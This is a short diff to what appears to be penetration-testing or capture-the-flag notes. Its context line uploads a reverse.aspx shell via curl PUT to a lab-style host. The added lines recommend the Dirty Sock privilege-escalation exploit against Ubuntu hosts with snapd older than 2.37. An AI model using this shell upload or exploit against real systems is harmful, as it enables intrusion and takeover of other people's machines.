@@ -124,6 +124,8 @@ curl -X PUT http://10.10.10.15/_vti_log/reverse10.txt --data-binary @reverse.asp
 ```bash
 uname -a
 ```
+##### If its an ubuntu and snapd version < 2.37
+*USE DIRTY_SOCK EXPLOIT! (Version2)*
 
 #### Windows
 ```bash
